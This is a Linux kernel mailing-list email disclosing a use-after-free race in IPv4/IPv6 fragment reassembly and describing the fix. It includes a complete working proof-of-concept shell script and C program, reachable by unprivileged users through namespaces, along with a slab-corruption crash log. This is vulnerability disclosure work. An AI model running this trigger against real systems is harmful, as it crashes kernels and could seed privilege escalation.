Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3063742D758
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 17:23:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785173022; cv=none; b=j+1gfvnTo430X2dSt+dWC6X/G/jg3Y5z0K7C1Nt8lY7TDxcbvgi3lXGi2UwCRdjOujXYwP6UOqkO8+bBDS+Vpc5nmu/pEHhFF4RdBsebUDECUEvIsNtDtbFXQB3VfYQEgAUSTi1/Dj3cYa1L+miinSMk2QOghrD7kVox4uFv6qM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785173022; c=relaxed/simple;
	bh=WtgwW2ESTmPhVLv1byDwLpFaGN6qpoMdLXYsmOkmtNg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=aEQW2qzlquvErRzYQWE8tni+aIRH6S/ShzpO1BYEOAR40l+2yurvVPyCk3R49X2EbuRxGVEBdbypynCEpPOnj3QY3On70ju9HFaI5jS4+8mMAGoKfPxD/5Ny+gfOFO0kqi3I21tCm4X15Ylno1WjRhKhWHxA2xBbDkF6StKdIU4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=k5nJepH0; arc=none smtp.client-ip=209.85.214.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="k5nJepH0"
Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2cce6a0c9c3so33800805ad.1
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 10:23:37 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785173017; x=1785777817; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=yXV9JLAxtspAnvi4DyyR8PPI6feW/0bcZW3im0FrBGs=;
        b=k5nJepH0Vyp3M2w92D7AXoPyK1q7CyTiajXqCXQlEUE5RUJfjKfeb3/94qUYDix60r
         DxoQyqovOYwWKsJ8N3yCrtMB/xJb1kVD2VmPvSiqZn3U8p+6NrtXamd4VSPBfoearba2
         U7+ADknw7k3fQU0gO3Kg2D2yMzWGTJ/N/rjDxflBZ5UADH4uBMRLaFGNeEvpFxFqWFJS
         zZ6r2sY/5dUScc7FZQ8uOT6vE+uCE2wtETa+QLjWRlNmeoHLNTGl1rpPGOLkgcNkMOB4
         48jPxZod6crq3bYtJBvf1ENBx/II6raHGHJjFetJFDIqwryUItfsxnRWacpnWz/0ZO3A
         qR+w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785173017; x=1785777817;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=yXV9JLAxtspAnvi4DyyR8PPI6feW/0bcZW3im0FrBGs=;
        b=YxWLXN65farbf6Uy1Tv44pOZoG+ITYMPLkrc3rkzjUTStEeXZw69/KrqgzHHd7xsey
         gU5tobtrTuYhwWcJgkbRAgrtcIAnL2WI1hPpAWD8ebuTxDKC4J5/qDllasniWXHCcYAV
         OHHtwGLdLfNp4C6SEzAL0gPgJht+9wcvoXyCkub1xOws1zvmLStoHIITuvZ7tXXvlAbk
         p57V73RUqfezX9q17BtZzfYrEgZXW8Ggbs0qVUTtwJowAwPdiNhpYs2RoDKlSzIZmVcs
         AimVTfhdxXJVHR5InakdJ9tlRow7nhp4HnajHVUxSolQDEXg7Uq/B8c/+KUWpEZDh8+c
         acnw==
X-Gm-Message-State: AOJu0YyVFcHvpJ4BBZW6DVxZETA6EzJ6L1wSUWc5FECSlrI/yPzM2sM2
	bn/+DSYVl7MDUtDoMT7lxUvei5lCUNPyarobrAXljQL5KWOUIzNpdx+pzGhzaDCm7K0=
X-Gm-Gg: AR+sD12enUDzZLNuAdtC4iu3fjFz2TPYbuGdDK3Sj+yQAkStrb6OdCmQsANFv8H6/ar
	o7HnZMfFPWb7gCffWeqof59ZNuGYaKFwaEWV6tGesXelnLsnL9p4vTbb3wDqjvj8Wqv/66S5+wp
	4nnkQoX4btJ2lIwENx9pwO+vx+F2EdytT0gtzasZB2D+v6i686QZgWtc9vQMCRv8mEO1qhIZNAv
	+4DOtTHAGe4o2wXYdPIMN44XF930rjltYe2H1k4Pi37oTABDRYtvMDTtCHNsMyLkbwOklg99HAI
	/jHgbl/fdeCQcJ6xZHM2Nmkf/rTy6D+vBCPN72yM8/rnLag4NEH+Swo8qvw7G6jJyvrdTdIS0gV
	jgUmFjwhllJGTZOGhbRkGtyz26jPtkVW0OHD7e+F9F+8/z38pLHDciqA9IM7X0hvFGjzi3/9KrZ
	M4wjlKTY3yETc0NuHx2GIq9RZMeBq68GM=
X-Received: by 2002:a17:902:da85:b0:2c9:ff29:3f73 with SMTP id d9443c01a7336-2d00f39af2bmr1767835ad.28.1785173016118;
        Mon, 27 Jul 2026 10:23:36 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cfde5e2a78sm39719795ad.26.2026.07.27.10.23.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 10:23:35 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] inet: frags: publish queues before arming timer
Date: Tue, 28 Jul 2026 01:23:28 +0800
Message-ID: <cover.1784948849.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/inet_fragment.c. The bug is
reachable by a non-root user after creating user and net namespaces with
namespace-local CAP_NET_ADMIN and CAP_NET_RAW.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

inet_frag_create() allocates a fragment queue and gives it references for
the timer and the hash table. It currently arms the queue timer before
publishing the queue in the fqdir rhashtable.

If a namespace fragment timeout is zero or negative, the timer can run
before rhashtable insertion. The timer callback marks the queue complete,
tries to remove the not-yet-published node, and drops the assumed hash
reference. Creation can then publish the completed queue without restoring
that reference. After the caller releases the remaining reference, the
queue is freed while its node is still reachable from the hash table.

The reproducer uses IPv6 conntrack defragmentation in LOCAL_OUT and a
namespace-local negative nf_conntrack_frag6_timeout to trigger this race.
Later fragment lookups or namespace teardown then touch the stale node.

The fix publishes the queue first and arms the timer while holding the
queue lock. This makes timer expiry wait until the queue is visible in
the hash table, so inet_frag_kill() can remove the node and balance the
hash reference.

Reproducer:

    ITERATIONS=1 MODE=userns ./poc.sh --threads 4 --count 200 \
        --rounds 2 --grace-ms 200

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
MODE=${MODE:-root}
ITERATIONS=${ITERATIONS:-20}

run_once() {
	if [ "$MODE" = "userns" ]; then
		unshare -Urn "$DIR/poc" "$@"
	else
		unshare -rn "$DIR/poc" "$@"
	fi
}

i=1
while [ "$i" -le "$ITERATIONS" ]; do
	echo "iteration $i/$ITERATIONS mode=$MODE"
	XTABLES_LOCKFILE="/tmp/xtables.lock.$$.$i" run_once "$@"
	i=$((i + 1))
done

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define IPV6_NEXTHDR_FRAGMENT 44
#define IPV6_FRAGMENT_MORE 0x0001

struct ipv6_header_raw {
	uint32_t ver_tc_fl;
	uint16_t payload_len;
	uint8_t nexthdr;
	uint8_t hop_limit;
	struct in6_addr saddr;
	struct in6_addr daddr;
} __attribute__((packed));

struct ipv6_frag_header_raw {
	uint8_t nexthdr;
	uint8_t reserved;
	uint16_t frag_off;
	uint32_t identification;
} __attribute__((packed));

struct udp_header_raw {
	uint16_t sport;
	uint16_t dport;
	uint16_t len;
	uint16_t check;
} __attribute__((packed));

struct fragment_packet {
	struct ipv6_header_raw ip6;
	struct ipv6_frag_header_raw frag;
	struct udp_header_raw udp;
} __attribute__((packed));

struct options {
	unsigned int threads;
	unsigned int count;
	unsigned int rounds;
	unsigned int grace_ms;
	bool probe;
	uint32_t base_id;
};

static unsigned long long send_ok;
static unsigned long long send_err;

struct round_ctx {
	pthread_barrier_t barrier;
	struct sockaddr_in6 dst;
	const struct options *opts;
	uint32_t round_base;
};

struct thread_arg {
	struct round_ctx *round;
	unsigned int thread_index;
};

static void die_errno(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void die_msg(const char *msg)
{
	fprintf(stderr, "%s\n", msg);
	exit(EXIT_FAILURE);
}

static void msleep(unsigned int ms)
{
	struct timespec ts;

	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (long)(ms % 1000) * 1000000L;

	while (nanosleep(&ts, &ts) != 0) {
		if (errno != EINTR)
			die_errno("nanosleep");
	}
}

static int run_cmd(char *const argv[])
{
	pid_t pid;
	int status;

	pid = fork();
	if (pid < 0)
		return -1;
	if (pid == 0) {
		execvp(argv[0], argv);
		perror(argv[0]);
		_exit(127);
	}
	if (waitpid(pid, &status, 0) < 0)
		return -1;
	if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
		errno = EINVAL;
		return -1;
	}
	return 0;
}

static void write_text_file(const char *path, const char *text)
{
	FILE *fp;

	fp = fopen(path, "w");
	if (!fp)
		die_errno(path);
	if (fputs(text, fp) == EOF) {
		fclose(fp);
		die_errno(path);
	}
	if (fclose(fp) != 0)
		die_errno(path);
}

static void setup_namespace(void)
{
	char *const ip_up[] = {
		"/usr/sbin/ip", "link", "set", "lo", "up", NULL,
	};
	char *const flush_output[] = {
		"/usr/sbin/ip6tables-legacy", "-w", "-F", "OUTPUT", NULL,
	};
	char *const set_policy[] = {
		"/usr/sbin/ip6tables-legacy", "-w", "-P", "OUTPUT", "ACCEPT", NULL,
	};
	char *const add_rule[] = {
		"/usr/sbin/ip6tables-legacy", "-w", "-I", "OUTPUT", "1",
		"-m", "conntrack", "--ctstate", "NEW",
		"-j", "ACCEPT", NULL,
	};

	(void)setenv("XTABLES_LOCKFILE", "/tmp/xtables.lock", 0);

	if (run_cmd(ip_up) != 0)
		die_errno("ip link set lo up");
	if (run_cmd(flush_output) != 0)
		die_errno("ip6tables-legacy -F OUTPUT");
	if (run_cmd(set_policy) != 0)
		die_errno("ip6tables-legacy -P OUTPUT ACCEPT");
	if (run_cmd(add_rule) != 0)
		die_errno("ip6tables-legacy -I OUTPUT -m conntrack");

	write_text_file("/proc/sys/net/netfilter/nf_conntrack_frag6_timeout",
			"-1\n");
}

static void fill_packet(struct fragment_packet *pkt, uint32_t ident)
{
	memset(pkt, 0, sizeof(*pkt));

	pkt->ip6.ver_tc_fl = htonl(6u << 28);
	pkt->ip6.payload_len = htons(sizeof(pkt->frag) + sizeof(pkt->udp));
	pkt->ip6.nexthdr = IPV6_NEXTHDR_FRAGMENT;
	pkt->ip6.hop_limit = 64;
	if (inet_pton(AF_INET6, "::1", &pkt->ip6.saddr) != 1)
		die_msg("inet_pton(::1) failed");
	if (inet_pton(AF_INET6, "::1", &pkt->ip6.daddr) != 1)
		die_msg("inet_pton(::1) failed");

	pkt->frag.nexthdr = IPPROTO_UDP;
	pkt->frag.frag_off = htons(IPV6_FRAGMENT_MORE);
	pkt->frag.identification = htonl(ident);

	pkt->udp.sport = htons((uint16_t)(0x1000u + (ident & 0x0fffu)));
	pkt->udp.dport = htons((uint16_t)(0x2000u + ((ident >> 12) & 0x0fffu)));
	pkt->udp.len = htons(sizeof(pkt->udp));
	pkt->udp.check = 0;
}

static int open_raw_socket(void)
{
	struct sockaddr_in6 bind_addr = {
		.sin6_family = AF_INET6,
	};
	int one = 1;
	int fd;

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0)
		die_errno("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
	if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &one, sizeof(one)) != 0)
		die_errno("setsockopt(IPV6_HDRINCL)");
	if (inet_pton(AF_INET6, "::1", &bind_addr.sin6_addr) != 1)
		die_msg("inet_pton(::1) failed");
	if (bind(fd, (const struct sockaddr *)&bind_addr, sizeof(bind_addr)) !=
	    0)
		die_errno("bind(::1)");
	return fd;
}

static void pin_current_thread(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		perror("sched_setaffinity");
}

static void send_fragment_batch(int fd, const struct sockaddr_in6 *dst,
				uint32_t start_ident, unsigned int count)
{
	struct fragment_packet pkt;
	unsigned int i;
	ssize_t ret;

	for (i = 0; i < count; i++) {
		fill_packet(&pkt, start_ident + i);
		ret = sendto(fd, &pkt, sizeof(pkt), 0,
			     (const struct sockaddr *)dst, sizeof(*dst));
		if (ret == (ssize_t)sizeof(pkt)) {
			__sync_fetch_and_add(&send_ok, 1);
			continue;
		}
		__sync_fetch_and_add(&send_err, 1);
	}
}

static void *sender_thread(void *arg)
{
	struct thread_arg *thread = arg;
	const struct options *opts = thread->round->opts;
	const long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
	uint32_t start_ident;
	unsigned int cpu;
	int fd;

	if (ncpu > 0) {
		cpu = thread->thread_index % (unsigned int)ncpu;
		pin_current_thread(cpu);
	}

	fd = open_raw_socket();
	start_ident = thread->round->round_base +
		      thread->thread_index * opts->count;

	pthread_barrier_wait(&thread->round->barrier);
	send_fragment_batch(fd, &thread->round->dst, start_ident, opts->count);
	close(fd);
	return NULL;
}

static void probe_round(const struct round_ctx *round)
{
	const struct options *opts = round->opts;
	unsigned int thread_index;
	int fd;

	fd = open_raw_socket();
	for (thread_index = 0; thread_index < opts->threads; thread_index++) {
		uint32_t start_ident;

		start_ident = round->round_base + thread_index * opts->count;
		send_fragment_batch(fd, &round->dst, start_ident, opts->count);
	}
	close(fd);
}

static void run_round(const struct options *opts, unsigned int round_index)
{
	struct round_ctx round;
	struct thread_arg *thread_args;
	pthread_t *threads;
	unsigned int i;

	memset(&round, 0, sizeof(round));
	round.opts = opts;
	round.round_base = opts->base_id +
			   round_index * opts->threads * opts->count;
	round.dst.sin6_family = AF_INET6;
	if (inet_pton(AF_INET6, "::1", &round.dst.sin6_addr) != 1)
		die_msg("inet_pton(::1) failed");

	if (pthread_barrier_init(&round.barrier, NULL, opts->threads + 1) != 0)
		die_errno("pthread_barrier_init");

	thread_args = calloc(opts->threads, sizeof(*thread_args));
	threads = calloc(opts->threads, sizeof(*threads));
	if (!thread_args || !threads)
		die_errno("calloc");

	for (i = 0; i < opts->threads; i++) {
		thread_args[i].round = &round;
		thread_args[i].thread_index = i;
		if (pthread_create(&threads[i], NULL, sender_thread,
				   &thread_args[i]) != 0)
			die_errno("pthread_create");
	}

	pthread_barrier_wait(&round.barrier);
	for (i = 0; i < opts->threads; i++) {
		if (pthread_join(threads[i], NULL) != 0)
			die_errno("pthread_join");
	}

	free(threads);
	free(thread_args);
	pthread_barrier_destroy(&round.barrier);

	msleep(opts->grace_ms);
	if (opts->probe)
		probe_round(&round);
	msleep(opts->grace_ms);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [--threads N] [--count N] [--rounds N] "
		"[--grace-ms N] [--base-id N] [--no-probe]\n",
		prog);
	exit(EXIT_FAILURE);
}

static unsigned int parse_uint(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &end, 0);
	if (errno != 0 || !end || *end != '\0' || value == 0 ||
	    value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}
	return (unsigned int)value;
}

static uint32_t parse_u32(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &end, 0);
	if (errno != 0 || !end || *end != '\0' || value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}
	return (uint32_t)value;
}

static struct options parse_args(int argc, char **argv)
{
	struct options opts = {
		.threads = 12,
		.count = 2000,
		.rounds = 8,
		.grace_ms = 1000,
		.probe = true,
		.base_id = 0x50000000u,
	};
	int i;

	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--threads") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			opts.threads = parse_uint(argv[i], "threads");
		} else if (strcmp(argv[i], "--count") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			opts.count = parse_uint(argv[i], "count");
		} else if (strcmp(argv[i], "--rounds") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			opts.rounds = parse_uint(argv[i], "rounds");
		} else if (strcmp(argv[i], "--grace-ms") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			opts.grace_ms = parse_uint(argv[i], "grace-ms");
		} else if (strcmp(argv[i], "--base-id") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			opts.base_id = parse_u32(argv[i], "base-id");
		} else if (strcmp(argv[i], "--no-probe") == 0) {
			opts.probe = false;
		} else {
			usage(argv[0]);
		}
	}

	return opts;
}

int main(int argc, char **argv)
{
	struct options opts;
	unsigned int round_index;

	opts = parse_args(argc, argv);
	setup_namespace();

	printf("threads=%u count=%u rounds=%u grace_ms=%u probe=%u base_id=0x%08x\n",
	       opts.threads, opts.count, opts.rounds, opts.grace_ms,
	       opts.probe ? 1u : 0u, opts.base_id);
	fflush(stdout);

	for (round_index = 0; round_index < opts.rounds; round_index++) {
		printf("round %u/%u base_id=0x%08x\n",
		       round_index + 1, opts.rounds,
		       opts.base_id + round_index * opts.threads * opts.count);
		fflush(stdout);
		run_round(&opts, round_index);
	}

	printf("completed all rounds send_ok=%llu send_err=%llu\n",
	       send_ok, send_err);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  100.308539] [Poison overwritten] 0xffff88811117ec10-0xffff88811117ec17 @offset=3088. First byte 0xc9 instead of 0x6b
[  100.308552] =============================================================================
[  100.308556] BUG nf-frags (Not tainted): Object corrupt
[  100.308560] -----------------------------------------------------------------------------

[  100.308563] Allocated in inet_frag_find+0x24a/0x670 age=8 cpu=1 pid=1068
[  100.308590]  inet_frag_find (include/linux/rhashtable.h:134 include/linux/rhashtable.h:153 include/linux/rhashtable.h:628 include/linux/rhashtable.h:671 net/ipv4/inet_fragment.c:423)
[  100.308597]  nf_ct_frag6_gather (net/ipv6/netfilter/nf_conntrack_reasm.c:398 (discriminator 1) net/ipv6/netfilter/nf_conntrack_reasm.c:462 (discriminator 1))
[  100.308604]  ipv6_defrag (net/ipv6/netfilter/nf_defrag_ipv6_hooks.c:63)
[  100.308609]  nf_hook_slow (net/netfilter/core.c:618 (discriminator 1))
[  100.308648]  rawv6_sendmsg (include/linux/refcount.h:186 (discriminator 1) include/linux/refcount.h:317 (discriminator 1) include/linux/refcount.h:335 (discriminator 1) include/net/ipv6.h:375 (discriminator 1) net/ipv6/raw.c:857 (discriminator 1))
[  100.308655]  __sys_sendto (net/socket.c:2258)
[  100.308663]  __x64_sys_sendto (net/socket.c:2268)
[  100.308669]  do_syscall_64 (include/linux/sched/task_stack.h:23 arch/x86/include/asm/entry-common.h:43 include/linux/irq-entry-common.h:100 include/linux/entry-common.h:174 arch/x86/entry/syscall_64.c:89)
[  100.308677]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  100.308684] Freed in rcu_core+0x260/0x620 age=1 cpu=1 pid=1068
[  100.308695]  rcu_core (kernel/rcu/tree_stall.h:113 (discriminator 2) kernel/rcu/tree.c:2864 (discriminator 2))
[  100.308702]  handle_softirqs (kernel/softirq.c:596 (discriminator 10))
[  100.308709]  __irq_exit_rcu (arch/x86/include/asm/bitops.h:202 (discriminator 1) arch/x86/include/asm/bitops.h:232 (discriminator 1) include/linux/thread_info.h:199 (discriminator 1) include/linux/thread_info.h:215 (discriminator 1) include/linux/sched.h:2283 (discriminator 1) kernel/softirq.c:695 (discriminator 1) kernel/softirq.c:742 (discriminator 1))
[  100.308714]  sysvec_apic_timer_interrupt (arch/x86/kernel/apic/apic.c:1061 (discriminator 17) arch/x86/kernel/apic/apic.c:1061 (discriminator 17))
[  100.308721]  asm_sysvec_apic_timer_interrupt (arch/x86/include/asm/idtentry.h:697)
[  100.308726] Slab 0xffffea0004445f80 objects=29 used=0 fp=0xffff88811117eaf8 flags=0x200000000000040(head|node=0|zone=2)
[  100.308734] Object 0xffff88811117ec10 @offset=3088 fp=0xffff88811117f930

[  100.308739] Redzone  ffff88811117ec08: bb bb bb bb bb bb bb bb                          ........
[  100.308744] Object   ffff88811117ec10: c9 34 48 03 81 88 ff ff 6b 6b 6b 6b 6b 6b 6b 6b  .4H.....kkkkkkkk
[  100.308747] Object   ffff88811117ec20: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308751] Object   ffff88811117ec30: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308754] Object   ffff88811117ec40: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308757] Object   ffff88811117ec50: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308760] Object   ffff88811117ec60: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308763] Object   ffff88811117ec70: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308766] Object   ffff88811117ec80: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308769] Object   ffff88811117ec90: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308772] Object   ffff88811117eca0: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308776] Object   ffff88811117ecb0: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk
[  100.308779] Object   ffff88811117ecc0: 6b 6b 6b 6b 6b 6b 6b a5                          kkkkkkk.
[  100.308782] Redzone  ffff88811117ecc8: bb bb bb bb bb bb bb bb                          ........
[  100.308785] Padding  ffff88811117ed18: 5a 5a 5a 5a 5a 5a 5a 5a                          ZZZZZZZZ
[  100.308789] Disabling lock debugging due to kernel taint
[  100.308810] ------------[ cut here ]------------
[  100.308813] WARNING: CPU: 2 PID: 32 at mm/slub.c:1124 object_err (mm/slub.c:1113 mm/slub.c:1213)
[  100.308824] Modules linked in:
[  100.308831] CPU: 2 UID: 0 PID: 32 Comm: ksoftirqd/2 Tainted: G    B              6.12.95 #1
[  100.308839] Tainted: [B]=BAD_PAGE
[  100.308842] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  100.308846] RIP: 0010:object_err (mm/slub.c:1113 mm/slub.c:1213)
[  100.308854] Code: 48 c7 c7 88 55 85 83 e8 57 07 db ff 4c 89 e6 48 c7 c7 8b c4 7b 83 e8 48 07 db ff be 01 00 00 00 bf 05 00 00 00 e8 a9 a2 d2 ff <0f> 0b 5b 5d 41 5c 41 5d e9 57 52 68 01 8b 45 58 6a 01 4d 89 e1 41
All code
========
   0:	48 c7 c7 88 55 85 83 	mov    $0xffffffff83855588,%rdi
   7:	e8 57 07 db ff       	call   0xffffffffffdb0763
   c:	4c 89 e6             	mov    %r12,%rsi
   f:	48 c7 c7 8b c4 7b 83 	mov    $0xffffffff837bc48b,%rdi
  16:	e8 48 07 db ff       	call   0xffffffffffdb0763
  1b:	be 01 00 00 00       	mov    $0x1,%esi
  20:	bf 05 00 00 00       	mov    $0x5,%edi
  25:	e8 a9 a2 d2 ff       	call   0xffffffffffd2a2d3
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	5b                   	pop    %rbx
  2d:	5d                   	pop    %rbp
  2e:	41 5c                	pop    %r12
  30:	41 5d                	pop    %r13
  32:	e9 57 52 68 01       	jmp    0x168528e
  37:	8b 45 58             	mov    0x58(%rbp),%eax
  3a:	6a 01                	push   $0x1
  3c:	4d 89 e1             	mov    %r12,%r9
  3f:	41                   	rex.B

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	5b                   	pop    %rbx
   3:	5d                   	pop    %rbp
   4:	41 5c                	pop    %r12
   6:	41 5d                	pop    %r13
   8:	e9 57 52 68 01       	jmp    0x1685264
   d:	8b 45 58             	mov    0x58(%rbp),%eax
  10:	6a 01                	push   $0x1
  12:	4d 89 e1             	mov    %r12,%r9
  15:	41                   	rex.B
[  100.308859] RSP: 0018:ffffc90000127ca0 EFLAGS: 00010246
[  100.308865] RAX: 0000000000000000 RBX: 0000000000000008 RCX: 0000000000000027
[  100.308869] RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffff88813bd21a00
[  100.308873] RBP: ffff88810280d540 R08: 0000000000000000 R09: 0000000000000003
[  100.308876] R10: ffffc90000127b40 R11: ffffffff84583688 R12: ffff88811117ec10
[  100.308880] R13: 0000000000000001 R14: 000000000000006b R15: ffff88811117ec10
[  100.308887] FS:  0000000000000000(0000) GS:ffff88813bd00000(0000) knlGS:0000000000000000
[  100.308892] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  100.308896] CR2: 00007f01ef712f78 CR3: 00000001117c2006 CR4: 0000000000770ef0
[  100.308903] PKRU: 55555554
[  100.308907] Call Trace:
[  100.308910]  <TASK>
[  100.308915]  check_bytes_and_report (mm/slub.c:1322)
[  100.308926]  check_object (mm/slub.c:1489)
[  100.308935]  ? rcu_core (kernel/rcu/tree_stall.h:113 (discriminator 2) kernel/rcu/tree.c:2864 (discriminator 2))
[  100.308942]  free_slab (mm/slub.c:3568 (discriminator 3))
[  100.308948]  kmem_cache_free (include/trace/events/kmem.h:117 (discriminator 1) mm/slub.c:6376 (discriminator 1))
[  100.308955]  rcu_core (kernel/rcu/tree_stall.h:113 (discriminator 2) kernel/rcu/tree.c:2864 (discriminator 2))
[  100.308963]  ? rcu_core (kernel/rcu/rcu_segcblist.h:105 (discriminator 1) kernel/rcu/tree.c:2860 (discriminator 1))
[  100.308970]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  100.308977]  ? __schedule (include/linux/hrtimer_rearm.h:17 include/linux/hrtimer_rearm.h:71 kernel/sched/core.c:978 kernel/sched/core.c:7067)
[  100.308986]  handle_softirqs (kernel/softirq.c:596 (discriminator 10))
[  100.308994]  ? __pfx_smpboot_thread_fn (usercopy_64.c:?)
[  100.309000]  run_ksoftirqd (kernel/softirq.c:1076 kernel/softirq.c:1068)
[  100.309006]  smpboot_thread_fn (kernel/smpboot.c:108 (discriminator 17))
[  100.309012]  kthread (kernel/kthread.c:401)
[  100.309018]  ? __pfx_kthread (include/linux/list.h:162)
[  100.309024]  ret_from_fork (arch/x86/kernel/process.c:153)
[  100.309032]  ? __pfx_kthread (include/linux/list.h:162)
[  100.309037]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  100.309049]  </TASK>
[  100.309053] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  100.310081] CPU: 2 UID: 0 PID: 32 Comm: ksoftirqd/2 Tainted: G    B              6.12.95 #1
[  100.311520] Tainted: [B]=BAD_PAGE
